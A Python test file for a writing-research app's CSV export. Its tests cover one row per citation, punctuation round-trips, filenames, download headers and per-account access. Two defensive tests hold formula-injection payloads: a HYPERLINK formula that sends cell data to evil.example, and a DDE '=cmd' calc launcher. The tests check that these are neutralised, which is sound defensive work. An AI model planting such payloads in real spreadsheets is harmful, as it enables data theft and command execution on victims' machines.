"""A filed sweep as a spreadsheet, and the ways that goes wrong.

Every cell in this file is either a writer's own scene text or an excerpt from
the open web. Both land in a program that will execute a cell if it is allowed
to, and both contain the punctuation that breaks hand-rolled CSV.
"""

import csv
import io
from unittest import mock

from fastapi.testclient import TestClient

from star import server
from star.exports import (
    COLUMNS,
    ROOM_COLUMNS,
    csv_filename,
    room_to_csv,
    safe_cell,
    sweep_rows,
    sweep_to_csv,
)
from star.store import sweep_to_document
from tests.test_scenes import AUTH, UID, a_store, filed_room
from tests.test_scenes import ROOM as ROOM_ID

SWEEP = {
    "room": {"title": "Doctor Who: Liverpool and Hamburg", "era": "1958-1962"},
    "claims": [
        {
            "text": "Kaiserkeller",
            "claim_type": "geography",
            "verdict": "confirmed",
            "scenes": [13, 17],
            "note": "Music venue at 36 Große Freiheit.",
            "citations": [
                {"url": "https://a.example/k", "title": "Kaiserkeller", "excerpt": "Opened 1959."},
                {"url": "https://b.example/k", "title": "Große Freiheit", "excerpt": "The street."},
            ],
        },
        {
            "text": "Ta.",
            "claim_type": "language",
            "verdict": "unverifiable",
            "scenes": [5],
            "note": "No source named.",
            "citations": [],
        },
    ],
}


def a_sweep(**overrides):
    return sweep_to_document({**SWEEP, **overrides}, "sw1", "2026-08-12T22:00:00Z")


def parsed(text):
    return list(csv.DictReader(io.StringIO(text)))


def test_a_claim_with_two_sources_is_two_rows():
    """Not one row with two urls in a cell.

    A writer opening this wants to filter on a domain, sort by verdict, and
    count how much of a draft rests on one site. A packed cell allows none of
    that.
    """
    rows = parsed(sweep_to_csv(a_sweep()))

    assert len(rows) == 3, "two sources plus one sourceless claim"
    assert [r["source_url"] for r in rows[:2]] == ["https://a.example/k", "https://b.example/k"]
    assert rows[0]["claim"] == rows[1]["claim"] == "Kaiserkeller", "sharing their claim"
    assert rows[0]["verdict"] == "confirmed"


def test_a_claim_nobody_could_answer_still_gets_a_row():
    """It is exactly the row a reader is looking for."""
    rows = parsed(sweep_to_csv(a_sweep()))
    bare = [r for r in rows if r["claim"] == "Ta."]

    assert len(bare) == 1
    assert bare[0]["source_url"] == ""
    assert bare[0]["verdict"] == "unverifiable"


def test_the_header_is_the_shape_the_importer_expects():
    rows = parsed(sweep_to_csv(a_sweep()))
    assert list(rows[0].keys()) == list(COLUMNS)
    assert "sweep_id" in COLUMNS, "so an import can find the sweep it belongs to"
    assert "scenes" in COLUMNS, "and a reader can see which pages to open"


def test_a_cell_that_would_run_as_a_formula_is_neutralised():
    """FORMULA INJECTION, and it is not hypothetical.

    Excel and Sheets have both shipped remote data exfiltration through a cell
    beginning `=`. Every cell here is a writer's own line or a page off the
    open web.
    """
    hostile = a_sweep(
        claims=[
            {
                "text": '=HYPERLINK("http://evil.example?x="&A1,"click")',
                "verdict": "confirmed",
                "scenes": [1],
                "citations": [
                    {"url": "https://x.example", "title": "@SUM(1+1)", "excerpt": "-2+3"}
                ],
            }
        ]
    )
    row = parsed(sweep_to_csv(hostile))[0]

    assert row["claim"].startswith("'="), "prefixed rather than stripped"
    assert row["source_title"].startswith("'@")
    assert row["source_excerpt"].startswith("'-")
    assert "HYPERLINK" in row["claim"], (
        "and NOT edited away — this file is read beside the draft it came from, "
        "so a writer's own line has to survive intact"
    )


def test_the_whitespace_that_slips_past_a_naive_prefix_check():
    for dangerous in ("\tSUM(1)", "\r=1+1"):
        assert safe_cell(dangerous).startswith("'"), dangerous
    for safe in ("Kaiserkeller", "1958", "", "a '61 Impala"):
        assert not safe_cell(safe).startswith("'" + safe[:1]) or safe == "", safe


def test_a_claim_full_of_punctuation_survives_the_round_trip():
    """A claim is an exact quotation from a draft. It will contain commas,
    quotes and line breaks, and hand-rolled quoting is how one of them shifts
    every column after it."""
    nasty = 'He said "INT. BUS", then, oddly,\nturned around.'
    document = a_sweep(
        claims=[{"text": nasty, "verdict": "confirmed", "scenes": [3], "citations": []}]
    )

    rows = parsed(sweep_to_csv(document))

    assert len(rows) == 1, "the newline did not become a second row"
    assert rows[0]["claim"] == nasty, "character for character"


def test_the_filename_is_something_a_writer_can_find_again():
    assert csv_filename("Doctor Who: Liverpool and Hamburg", "2026-08-12T22:00:00Z") == (
        "doctor-who-liverpool-and-hamburg-sweep-2026-08-12.csv"
    )
    assert csv_filename("", "") == "sweep-undated.csv"
    assert "/" not in csv_filename("A/B: C", "2026-08-12")


def test_rows_are_pure_and_do_not_touch_the_document():
    document = a_sweep()
    before = str(document)
    sweep_rows(document)
    assert str(document) == before


def test_the_download_is_a_file_and_not_a_page():
    """`text/csv` with an attachment disposition, never something a browser
    might render — a content type it can render is one it can execute."""
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())
    store.save_sweep(UID, ROOM_ID, "sw1", a_sweep())

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(
            f"/api/rooms/{ROOM_ID}/sweeps/sw1.csv", headers=AUTH
        )

    assert response.status_code == 200, (
        "and the route is reachable at all: registered ABOVE /sweeps/{sweep_id}, "
        "which matches in declaration order and otherwise swallows `sw1.csv`"
    )
    assert response.headers["content-type"].startswith("text/csv")
    assert "attachment" in response.headers["content-disposition"]
    assert "doctor-who" in response.headers["content-disposition"]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "Kaiserkeller" in response.text


def test_another_accounts_sweep_has_no_csv_either():
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())
    store.save_sweep(UID, ROOM_ID, "sw1", a_sweep())

    with mock.patch("star.server.verify_token", return_value="uid-two"), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(
            f"/api/rooms/{ROOM_ID}/sweeps/sw1.csv", headers=AUTH
        )

    assert response.status_code == 404


# -- the ROOM, which is a different question from a sweep --------------------


ROOM = {
    "created_at": "2026-08-10T00:00:00Z",
    "story_profile": {"title": "Doctor Who Special: Liverpool", "era": "1958-1962"},
    "categories": {
        "setting": {
            "findings": [
                {
                    "fact": "Mona Best opened the Casbah on 29 August 1959.",
                    "citations": [
                        {
                            "url": "https://casbah.example",
                            "title": "The Casbah",
                            "excerpt": "A six-room cellar in West Derby.",
                        },
                        {"url": "https://second.example", "title": "Also", "excerpt": "Again."},
                    ],
                }
            ]
        },
        "logistics": {
            "findings": [
                {
                    "fact": "Night trams ran on reduced headways.",
                    "citations": [],
                },
                {
                    "fact": "A pint cost about two shillings.",
                    "citations": [{"url": "https://prices.example", "title": "P", "excerpt": "2s"}],
                    "requisition": "what did a pint cost in 1958",
                    "retrieved_at": "2026-08-13T04:00:00Z",
                },
            ]
        },
    },
}


def test_a_room_exports_its_research_rather_than_a_drafts_answers():
    """The question a writer actually asked. A sweep says what a draft claimed
    and how it held up; this says what the department FOUND, and it exists
    without anybody having swept a screenplay."""
    rows = parsed(room_to_csv(ROOM, "room-1"))

    assert list(rows[0].keys()) == list(ROOM_COLUMNS)
    assert len(rows) == 4, "two sources on one finding, plus two more findings"
    assert {r["drawer"] for r in rows} == {"setting", "logistics"}
    assert rows[0]["room"] == "Doctor Who Special: Liverpool"
    assert rows[0]["era"] == "1958-1962"
    assert rows[0]["run_id"] == "room-1"


def test_a_finding_nobody_could_cite_still_gets_a_row():
    rows = parsed(room_to_csv(ROOM))
    bare = [r for r in rows if r["fact"].startswith("Night trams")]

    assert len(bare) == 1
    assert bare[0]["source_url"] == "", (
        "a fact with no source is exactly the row worth finding in a spreadsheet"
    )


def test_a_requisitioned_finding_carries_its_question_and_its_own_date():
    """The rule web/clip.js applies to the RET stamp, in a column somebody will
    sort by: a finding asked for after the build was retrieved when it was
    asked for, and stamping the room's date on it would be a fabricated
    provenance claim."""
    rows = parsed(room_to_csv(ROOM))
    asked = next(r for r in rows if r["fact"].startswith("A pint"))
    built = next(r for r in rows if r["fact"].startswith("Mona Best"))

    assert asked["requisition"] == "what did a pint cost in 1958"
    assert asked["retrieved_at"] == "2026-08-13T04:00:00Z"
    assert built["requisition"] == "", "and the build's own findings carry none"
    assert built["retrieved_at"] == "2026-08-10T00:00:00Z", "they take the room's date"


def test_a_room_export_is_not_a_program_either():
    hostile = {
        "story_profile": {"title": "X"},
        "categories": {
            "setting": {
                "findings": [
                    {
                        "fact": "=cmd|'/c calc'!A1",
                        "citations": [{"url": "https://x.example", "title": "@x", "excerpt": "-1"}],
                    }
                ]
            }
        },
    }
    row = parsed(room_to_csv(hostile))[0]

    assert row["fact"].startswith("'=")
    assert row["source_title"].startswith("'@")
    assert row["source_excerpt"].startswith("'-")


def test_a_room_and_a_sweep_are_told_apart_in_a_downloads_folder():
    assert csv_filename("Liverpool", "2026-08-13T00:00:00Z", kind="research") == (
        "liverpool-research-2026-08-13.csv"
    )
    assert csv_filename("Liverpool", "2026-08-13T00:00:00Z") == (
        "liverpool-sweep-2026-08-13.csv"
    )


def test_the_room_download_is_reachable_and_is_a_file():
    """Registered ABOVE `/api/rooms/{run_id}`, which matches in declaration
    order and would otherwise claim `abc.csv` — the exact bug the sweep CSV
    shipped with, under a comment claiming it had been avoided."""
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(f"/api/rooms/{ROOM_ID}.csv", headers=AUTH)

    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/csv")
    assert "attachment" in response.headers["content-disposition"]
    assert "research" in response.headers["content-disposition"]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "Impala" in response.text, "the room's own finding is in it"


def test_another_accounts_room_has_no_csv():
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())

    with mock.patch("star.server.verify_token", return_value="uid-two"), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(f"/api/rooms/{ROOM_ID}.csv", headers=AUTH)

    assert response.status_code == 404
